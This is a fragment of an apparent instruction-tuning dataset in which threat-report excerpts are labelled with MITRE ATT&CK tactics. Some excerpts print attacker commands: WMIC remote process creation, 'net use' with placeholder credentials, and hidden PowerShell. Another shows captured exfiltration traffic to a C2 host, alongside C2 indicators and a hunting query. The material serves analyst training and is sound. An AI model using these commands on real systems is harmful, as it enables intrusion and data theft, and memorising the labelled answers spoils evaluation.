        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No matter which group orchestrated this campaign, it constitutes a significant step up in terms of sophistication. The toolchain presented here was willfully split into a series of interdependent components that function together as a whole. Single pieces are difficult \u2013 sometimes impossible \u2013 to analyze in isolation, because they rely on code or data provided at other stages of the infection chain. We regretfully admit that this strategy was partly successful in preventing us from obtaining a complete picture of this campaign. As such, this report is as much about the things we know as it is about figuring out what we don't. We hereby extend our hand to fellow researchers who might be seeing other pieces of this vast puzzle, because we strongly believe that the challenges ahead of us can only be overcome through information sharing among trusted industry partners. \nSome readers from other regions of the world might dismiss this local activity as irrelevant to their interests. We would advise them to take heed. Experience shows that regional threat actors sometimes widen their area of activity as their operational capabilities increase, and that tactics or tools are vastly shared across distinct actors or intrusion-sets that target different regions. Today, we see a group focused on South-East Asia taking a major leap forward. Tomorrow, they may decide they're ready to take on the whole world. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: There are some benefits to separating the persistence we see at the start of an intrusion, and the persistence observed later in the intrusion.\nThe early-stage persistence is related to the malware families that facilitate initial access to an environment or exploits the target's internet facing services. Most often, we observe the initial access malware persist on the system via Registry Run Keys or a Scheduled Task and exploitation attempts usually left web shells, which were accessible via the internet.\nEmotet andUrsnifwere observed using Run Keys for persistence. Emotet was seen copying a DLL into the user's AppData folder and executing it with rundll32, whileUrsnifused a Run Key to execute a PowerShell script via a LNK file.\nIcedID, Qbot, and Gootloader have all been observed making use of Scheduled Tasks to execute their payloads after the main execution of the malware.\nLastly, the creation of web shells were observed during the exploitation of internet facing services inPHOSPHORUS Automates Initial Access Using ProxyShellandWill the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration.\nLate stage persistence takes place after the initial compromise and does not have a set time frame. While the early stage persistence targets the beachhead of the intrusion, later stage persistence may be present in other areas of the network the threat actor moved to laterally.\nIn 2022, we saw the rise of various Remote Access Software tools, such as AnyDesk and Atera. Threat actors take advantage of these tools to go undetected due to their innocuous nature. In some cases, organizations utilize these remote access tools to administer their organization. This allows threat actors to blend in.MITRE does not categorize Remote Access Softwareas a means of persistence, however, this could be a suggested entry as this software has the ability to persist a reboot and allow threat actors to persist in the environment via the startup service it creates (T1569.002).",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor enabled WDigest authentication by changing the value of the \"UseLogonCredential\" object from 0 to 1 in the Windows registry. This enforces the storage of credentials in plaintext on future logins.\nProcdump v9.0 (SHA1: d1387f3c94464d81f1a64207315b13bf578fd10c) was downloaded using PowerShell and used to dump the LSASS process to disk.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot's \"pwgrab\" module.\nLSASS was dumped remotely using ProcDump. The execution took place from the beachhead using WMIC.\n\"Ntdsutil\" was used to take a snapshot of ntds.dit and save it under \"C:\\Perflogs\\1\". This technique is useful for offline password hash extraction. This activity occurred twice. The same batch file, '12.bat', was first executed in the context of SYSTEM; and secondly, in the context of a domain admin user. The contents of '12.bat':",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a 'Run' key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors ran the AdFind utility for domain discovery.\nThe following net commands were used by the threat actor.\nWhile on systems, we also saw them use the following commands.\nThe following Nltest commands were executed several times by the threat actors over the course of the intrusion.\nThe ping command was then used to test connectivity to the domain controllers and other systems.\nBloodhoundwas ran for domain attack path enumeration.\nThe followingPowerviewcommands were also seen invoked by the threat actors for discovery.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Kimsuky is a highly motivated threat actor targeting a number of entities in South Korea. This group has been relentlessly creating new infection chains to deliver different types of malware to their victims. This campaign relies on the abuse of Blogspot to host attacker-operated blogs serving malicious VB based scripts to their targets. We've found preliminary malicious components from initial access beacons to file exfiltrators being deployed to victims. In many cases, the content of these preliminary components was combined to serve special scripts to victims. \nThe final implants utilized by the actors in this campaign are derivatives of the Gold Dragon/Brave Prince malware families. Since late 2020, the actors have introduced multiple capabilities (and removed some) in the implants eventually modularizing them into three distinct malware. \nApart from stealing research using bespoke file exfiltrators, another goal of the campaign is to gather credentials using trojanized tools such as Nirsoft's WebBrowserPassView and use implants to establish continued unauthorized access into entities of interest. Such targeted attacks can result in the leak of restricted research, unauthorized access for espionage and even destructive attacks against target organizations. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign.   \nYou can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nThe Snort SIDs for this threat are: 58496-58497. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: So, what else could be sent up in DNS queries? Well, anything in theory, so long as it's encoded correctly and doesn't abuse the UDP size limits. A way for getting around the latter constraint could be to send multiple A record messages and have them stitched together somehow on the server-side. Complications would arise however in dropped or missing datagrams.\nUnlike TCP that ensures retransmission of failed packets, UDP has no such mechanism. An algorithm would be required to understand how many messages will be sent, and check the correct number arrives, but more complicated than that, somehow ask the client to retransmit certain segments of the data again until 100% arrives. Depending on the amount of data to transmit  every PDF on the system, for example  may take an age, and look hugely suspicious to network administrators.",
        "output": "exfiltration",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0537 uses a variety of methods that are typically focused on compromising user identities to gain initial access to an organization including: \nDeploying the malicious Redline password stealer to obtain passwords and session tokens   \nPurchasing credentials and session tokens from criminal underground forums   \nPaying employees at targeted organizations (or suppliers/business partners) for access to credentials and MFA approval   \nSearching public code repositories for exposed credentials \nUsing the compromised credentials and/or session tokens, DEV-0537 accesses internet-facing systems and applications. These systems most commonly include virtual private network (VPN), remote desktop protocol (RDP), virtual desktop infrastructure (VDI) including Citrix, or identity providers (including Azure Active Directory, Okta). For organizations using MFA security, DEV-0537 used two main techniques to satisfy MFA requirementssession token replay and using stolen passwords to trigger simple-approval MFA prompts hoping that the legitimate user of the compromised account eventually consents to the prompts and grants the necessary approval. \nIn some cases, DEV-0537 first targeted and compromised an individual's personal or private (non-work-related) accounts giving them access to then look for additional credentials that could be used to gain access to corporate systems. Given that employees typically use these personal accounts or mobile phone numbers as their second-factor authentication or password recovery, the group would often use this access to reset passwords and complete account recovery actions. \nMicrosoft also found instances where the group successfully gained access to target organizations through recruited employees (or employees of their suppliers or business partners). DEV-0537 advertised that they wanted to buy credentials for their targets to entice employees or contractors to take part in its operation. For a fee, the willing accomplice must provide their credentials and approve the MFA prompt or have the user install AnyDesk or other remote management software on a corporate workstation allowing the actor to take control of an authenticated system. Such a tactic was just one of the ways DEV-0537 took advantage of the security access and business relationships their target organizations have with their service providers and supply chains. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed MERCURY further using its foothold to compromise other devices within the target organizations by leveraging several methods, such as: \nWindows Management Instrumentation (WMI) to launch commands on devices within organizations.   \nRemote services (leveraging RemCom tool) to run encoded PowerShell commands within organizations. \nMost of the commands launched are meant to install tools on targets or perform reconnaissance to find domain administrator accounts. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: UNC4466 made use of BITS transfers (using the Start-BitsTransfer PowerShell cmdlet) to download various resources to the staging directory c:\\ProgramData\\`. Using this technique, SOCKS5 tunneling tools, REVSOCKS and LIGOLO were downloaded from their official GitHub repositories. ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From a file share server the threat actor opened internet explorer and pulled up two sites, qaz[.]im and temp[.]sh.\nBoth of these sites are known as anonymous temporary file sharing services. They are often used to deploy tools or payloads by threat actors, but in this case we did not observe any downloads. This leads us to assess that they likely used the sites for some small scale data exfiltration.\nAround 20 minutes later the threat actor move on to large scale exfiltration using Rclone.\nTheir initial attempt to exfiltrate data with Rclone utilized a FTP configuration targeting a remote server at 93.115.26.127 over port 21. This attempt to exfiltrate data failed because a connection to the remote server could not be established.\nThe command that was executed was:\nTwo hours later, the threat actor changed tactics and leveraged Rclone's MEGA integration to exfiltrate data toMega.io. The following command was executed during this second attempt:\nThe initial attempt successfully led to data exfiltration to theMega.iostorage service. The following day, the threat actor leveraged a second FTP account and a different server hard-coded into the rclone configuration, achieving another successful exfiltration.\nAnalysis of network logs revealed that several gigabytes of data were exfiltrated over a 16-hour period.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In January 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks on military industrial complex enterprises and public institutions in several countries. In the course of our research, we were able to identify over a dozen of attacked organizations. The attack targeted industrial plants, design bureaus and research institutes, government agencies, ministries and departments in several East European countries (Belarus, Russia, and Ukraine), as well as Afghanistan. \nThe attackers were able to penetrate dozens of enterprises and even hijack the IT infrastructure of some, taking control of systems used to manage security solutions. \nAn analysis of information obtained while investigating the incidents indicates that cyberespionage was the goal of this series of attacks. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique : Event Triggered Execution: Image File Execution Options Injection (T1546.012) ",
        "output": "privilege escalation",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware uses System.Web Namespace to enable the browser-server communication to the C2 server with a Nginx web server. The HTTP backdoor method is used by placing the information from the compromised machine into the data section of the HTTP POST request to the domains russk18[.]icu and moscow13[.]at. \n[Expert Info (Chat/Sequence): PoST /forum8/logout.php HTTP/1.1\\r\\n] Request Method: POST Request URI: /forum8/logout.php Request Version: HTTP/1.1 Content-Type:application/x-www-form-urlencoded\\r\\n User-Agent: Mozilla/5.0 (Windows NT 10.0;wow64; Trident/7.0; rv:11.0) like Gecko\\r\\n Host: russk18.icu\\r\\n Content-Length: 106o\\r\\n Cache-Control: no-cache\\r\\n [Full request URI: http://russk18.icu/forum8/logout.php] [HTTP request 1/1] [Response in frame: 472] File Data: 1060 bytes \nContent-Type: application/x-www-form-urlencoded   \nGecko   \nHost: russk18.icu   \nContent-Length: 1060 bijqr $=$ 44979199&dmpybkn $=$ 3d9f1142fda964290155f4f76fa4927dae5657e1d6d000e050818e2 8c9e8485cb1dd&fqVg1wbmr=52AB8EEC2C054FB8F187FCDF712C1B56D83B13AEEC4B5DD1B30AC1 010F08D4EC88BD2FFB828B8FFEE8D99784CD3C8877FEE4981FC98FE8072AFB94802584EE5513A2 158FE694CBAD9F57A7429CBD3B36E0B8FBE062954A637E3136FA84489104F8F2437B0E1C74DE6A 8383B395671261705627214686C68C0414666FB24953BAA220CE7293E7DF63264E2F54ACA4F1FC 5268B26990B2AC419D8EBFBB52DB2BB5571611D8474EBE084A780A2B645265298B1EA8C3545C28 2D26D3F0C9978A775A27ECF2255E77B1811CF410D706F9CFCC024E12A80DBB016A8B8BECEF3408 918D0F7C6A177312A6E6D9DBB60F60BE35AA7515C90D6043F5A65A7E0BD50DD74F83CF8BE8E5DE 055600CA93292DB1D3FA1C3FC76C43868F2EA4BB6F720A6AD41AC8119A3F19&hub0V1=F792C85B C6C7F379D5C5D06AC0C9C84CDBC7F367D188C17BD0C9E06EC688A6258491C87A8D91FD6C85CFED 3A9ACDEC6EB4&hubov2 $=$ DDCDEC7BD8C7E66E9ACDEC6EB4&hub0V3=F0EDC740E0E7C42686EBA742 E5E0DB57E6EDD90B&hub0V4=FDC6E06ED880C62294EBFB79D180C0469D88FD329991AD3384E0DF 2BF7F8C12BF488A6258098D343CEA8&hub0v5=E2E5E36AC6CDB458E2EFD52B87EC94&hub0V6=84 98A7398D85A53B8590A5268D9FAD3E8185D54A8C9CA70BHTTP/1.12000K   \nContent-Type: text/html   \nContent-Length: 258   \nConnection: close \nWireshark displays the HTTP POST request traffic to the C2 russk18[.]icu and the data section of the packet. ",
        "output": "exfiltration",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon moving laterally to a backup server, we observed Cobalt Strike injection into legitimate process \"winlogon.exe\" and \"rundll32.exe\".\nBy relying on memory captures, defenders may also have other detection methods. Here, by processing the acquired memory withMemprocFSand using thefindevilcommand, we can find an injected beacon in winlogon.exe.\nDuring the intrusion, the threat actor deleted the renamed ScreenConnect installers from the backup server and the file server using the \"del\" command, in an attempt to cover their tracks.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors won't be slowing down anytime soon, particularly as organized cybercrime groups make it even easier for them to achieve a quick payday. However, there are numerous actions organizations can take today to better protect their networks from these adversaries.\nSharing and utilizing threat intelligence has never been more important to combat the ever-increasing sophistication and volume of cyberthreats. Additionally, understanding attack flows-from initial entry points to post-exploitation activities-is vital to creating effective cybersecurity strategies. Finally, there's no better time to implement new security technologies and reassess your team's processes and playbooks. Developing and maintaining a comprehensive defense strategy is crucial to protecting enterprise networks today and in the future.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1505.003 Server Software Component: Web Shell\nThe threat actor uploaded aweevely webshellto:\nUsing the session log left behind, we were able to identify the threat actor used the web shell to identify sensitive information on the host:\nT1569.002 System Services: Service Execution\nThe threat actor used Sliver's execute-assembly to loadSharPersist.\nThe Sliver audit log recorded the arguments provided to SharPersist which were used to create a Windows service called HealthCheck to run encoded PowerShell.\nWhen decoded, we can see this creates a reverse shell:\nThey also used sc to create a service for a Sliver implant to gain persistence:\nT1053.005 Scheduled Task/Job: Scheduled Task\nLoaded in the same way as above, SharPersist was used to create a scheduled task also called HealthCheck to run C:\\ProgramData\\Software\\svchost.exe :\nT1546.004 Event Triggered Execution: Unix Shell Configuration Modification\nThe threat actor used Sliver to upload modified versions of .bashrc to compromised hosts and set up a coin miner. We were able to recover the uploaded files and can see the appended lines below:\nThe referenced autominionlx.sh is downloaded from the Sliver server:\nShortly afterwards, the Sliver implant is used to add a cronjob to execute the script:\nError messages indicate the bash script is related to the execution of xmrig.\nThese error messages are resolved by the installation of xmrig, and copying the file to the tmp directory under the .atmon name:\nNow the victim system is added to the mining pool for the threat actor:\nA review of the XMR Monero Mining Payment History shows activity for the XMR address executed by the script:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Look for PowerShell launched from MSBUILD with the related commands. Run Query in Microsoft Defender for Endpoint \nDeviceProcessEvents where FileName $=\\sim$ \"powershell.exe\" where ProcessCommandLine has \"is64bitoperatingsystem\" and ProcessCommandLine has \"Debug\\\\Browse\" ",
        "output": "execution",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process Injection\nThe threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.\nThe specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread. This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.\nThe following table summarizes the processes used for injection during this case:\nPowerTool\nPowerTool was observed, dropped and executed on the server used to deploy the ransomware payload. This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files. It has been reportedly used by several ransomware groups to aid in their operations [1][2][3][4].\nAs a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.\nIndicator Removal\nThe threat actor was observed deleting files that had been dropped to disk.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As we saw from the execution section,dllhost.exewas used to access the below domains for C2, which we believe was using a variation of FRP.\ntcp443.msupdate[.]us (107.173.231[.]114) \nkcp53.msupdate[.]us \n(107.173.231[.]114)\nThis C2 channel was not used very much as most activity was done through the web shell.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found thatIcedIDwas the payload choice delivered this time, similar to activity noted recently byJames Quinn.\nThe delivery format was anxlsm file:\nInitial execution of the document writes a file to:\nThe Excel file called wmic to execute the file with regsrv32\nThis then made a network request to download a file from this URL\nThe GIF however was theIcedIDmalware.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS Access\nSuspicious accesses to LSASS process memory were observed during this intrusion. As illustrated below, those accesses have been made using bothWindows Task Managerandrundll32.exewhich is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):\nThe threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1113: Screen Capture T1213: Data from Information Repositories T1560: Archive Collected Data ",
        "output": "collection",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion. A few minutes after gaining access, they moved laterally to a domain controller and then executed a PowerShell launcher forEmpire.Later during the intrusion, the threat actors employed another OST namedKoadic. To execute Koadic, they employed a MSHTA launcher with javascript.\nFrom those two executions, various child processes were created to load stage 2 into memory.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Sincethe original discovery of Cardinal RAT, the attackers have made some minor updatesthatare worth discussing, particularly regardingobfuscation techniques. For the sake of this analysis we'll look atthemost recent version of CardinalRAT:\nThe last timewe wrote about Cardinal RAT in 2017, we looked at version 1.4 of the malware family.We identify this latest sample as version 1.7.2 based on information within the payload. Unlike previously discussed samples, thislatestinstance of Cardinal RAT employs various obfuscation techniques to hinder analysis of the underlying code. The first layer of obfuscation comes in the form of steganography;the initial sample is compiled with .NET and contains an embedded bitmap (BMP) file.\nFigure1.Embedded BMP file contained within .NET loader\nUpon execution, the malware will read this file, parse out pixel data from the image, and decrypt the result using a single-byte XOR key.We have provided aPython script to automate this process in the Appendix of the blog post. The result is a DLLalso compiled with .NET,with the following hash:\nAfter this file has been loaded in memory, the initial loader will load and execute the 'corerun'function, initiating the second stage of the malware.TheDLL begins by performing a sleep using the built-in Windowschoiceutility:\ncmd.exe /c choice /C Y /N /D Y /T 20\nThe command promptsthe user for a choice with a 20 second timeout,at which pointthe process will exit.Since the window is hidden, and there is no utility for this choice, themalware simplyuses this as an alternativesleep command.\nThesecond stageDLL readsin the 'strings' embedded resource from the first stage executable.Part of this resource is decrypted to provide configuration information to the dropper. This configuration information will instruct whether or not the malwareentersits installation routine.In the installation routine,itbeginsbywriting a unique GUID identifier to %TEMP%\\[random].ini. Afterwards,it createsthe following directory:\n%APPDATA%\\Microsoft\\Windows\\IEConfig\nIt then writes an embedded executable with the hash below to %TEMP%\\[random].exe. This file has an internal filename of RunExecutive.exe and simply copies the contents of argument #2 to the file path specified in argument #1.\nThe malware creates anLNK file in the victim's startup folder witharandomly generatedfilename using aGUID (Example:{fcb29182-b3cc-47e2-a95c-b22c6d87dda1}.lnk). TheLNK fileexecutes the followingcommand:\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden \"%APPDATA%\\Microsoft\\Windows\\IEConfig\\[random]\\sqlreader.exe\"\nFinally, the malware will execute the previously writtenRunExecutiveexecutable with arguments to copy the original executable to the previously referenced sqlreader.exe file path.\nTheremaining segment of theembeddedresource is decrypted using a 16-byte XOR key, resulting in a .NET executable. This executable isinjected into one of the following two legitimate executablesor processeson the system:\nRegSvcs.exe\nRegAsm.exe\nInprevious versions of this malware family,there were alarger number oflegitimate processes Cardinal RAT would inject into. The final payload has the following hash:\nUnderneath all this obfuscation,this Cardinal RAT payload doesnothaveany significant changes compared to the previously discussed versionin terms of its operation or capabilities.One of the most significant changeslies inthe obfuscation used by the malware;all of the functions, methods, and variables have been renamed toMD5 hashes.\nFigure2.Obfuscation present in Cardinal RAT payload\nIn addition to the obfuscation routines in use, there have been a few minor changes within the malware itself. First,the embedded configuration has a few changes both in the order of the embedded values, as well as what values are present. Additionally, the way this configuration is encoded has changed slightly, asseveralvaluesthat were previously base 64 encoded in version 1.4are no longer base64-encoded.\n$ python parseConfig.py GreyCardinalConfig\nMutex: {509ce3ef-e03e-467e-be19-710782f13c28}\nCampaign Identifier: '\\xf1\\xaf\\x02i.]\\xa4\\xe0'\nC2 Server: affiliatecollective[.]club\nC2 Port: 443\nHash Value: 0304674e9876530dfbea5a9b4fec7b98\nAdditional C2 Servers: 0\nGUID: '\\xd6\\x04hr\\x9a\\xedLN\\xae\\xe8\\xd0\\x87\\x80\\x19\\x15z'\nBuffer Size: 81920\nMax Buffer Size: 40960000\nSleep Timer Between Requests: 2000\nUnused Integer: 60000\nUnused Integer: 0\nPerform Keylogging: 0\nDisable Sleep on Victim: 0\nNetwork communication and actions available to the remote operator remain consistent between versions. The script provided inourprevious report continues to work as expected against the network traffic generated by this malware family. The following actions continue to be present within the malware:\nCollect victim information \nUpdate settings \nAct as a reverse proxy \nExecute command \nUninstall itself \nRecover passwords \nDownload and Execute new files \nKeylogging \nCapture screenshots \nUpdate Cardinal RAT \nClean cookies from browsers",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the next attack stage, the threat actors established a command shell via Extended SQL Stored Procedure (xp_cmdshell). This process allows you to issue operating system commands directly to the Windows command shell. To do this they enabled the feature the MSSQL configuration:\nThe threat actor then executed a Cobalt Strike beacon and a PowerShell script that has previously been identifiedby Sophosas used in campaigns to deploy Tor2Mine malware.\nThe overall execution events are depicted in the below diagram:\nThe first PowerShell script executed a command to download a Cobalt Strike beacon.\nThis was followed by a second PowerShell execution for:\nA connection was then established with the following Tor2Mine server and URIs:\nTor2Mine uses a PowerShell script checking.ps1 to perform variety of operations. The script first sets a variable named $priv and $osver to check whether the active user is an administrator and the operating system version respectively, in the first few lines.\nIt then attempts to pull down an additional script named kallen.ps1, a PowerShell version of mimikatz from the Tor2Mine server.\nIt also consists of a function named \"StopAV\", where it tries to disable antivirus solutions  in this case, MalwareBytes, Sophos and Windows Defender.\nDepending upon the result of the $priv variable, there are 2 routes for the script: Privileged \"PrivTrue()\" and Non-Privileged \"PrivFalse()\".\nIf the user is a privileged user, it first checks for the OS architecture, then downloads appropriate version (in our case, x64) of the miner and installs it as java.exe, in the \"C:\\ProgramData\\Oracle\\Java\" directory. It also installs a driver named WinRing0x64.sys.\nThe function also creates multiple scheduled tasks and services which have references to Tor2Mine miner java.exe, encoded PowerShell commands and .hta files hosted on Tor2Mine servers.\nIn the case of the non-privileged function \"PrivFalse()\", it executes a batch script \"PrivFalse.bat\" as scheduled tasks and also sets up schtasks as seen in the \"PrivTrue()\" function.\nIn the last section, a script named del.ps1 is downloaded and executed on the host as a scheduled task. The del.ps1 script has been explored further in the Defense Evasion section.\nDepending upon the output of the $priv variable, the execution flow is as follows:\nAs the mimi function is commented, we didn't observe any artifacts related to kallen.ps1 script.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The macros are also responsible for achieving reboot persistence for the ObliqueRAT payloads.   \nThis is done by creating a shortcut (.url file extension) in the infected user's Startup directory. \nMalicious shortcut in the infected user's startup directory to execute ObliqueRAT on startup. ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After acquiring the login credentials, the actor started to move laterally from workstations to server hosts. Typical lateral movement methods were employed, using Windows commands. First, a network connection with a remote host was established using the command \"net use\". \nnet use \\[IP address\u5165IPC\\$ \"[password] /u:\"[user name]\" $>\\$8$ temp\\\\~tmp5936t.tmp 2>&1\u2033 \nNext, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC). \nexe /node:[IP address] /user:\"[user name]\" /password:\"[password]\" PROCESS CALL CREATE \"cmd.exe /c \\$appdata\\Adobe\\adobe.bat\"   \nexe /node:[IP address] /user:\"[user name]\" /password:\"[password]\" PROCESS CALL CREATE \"cmd /c sc queryex helpsvc $>$ \\$temp\\tmp001.dat\" ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
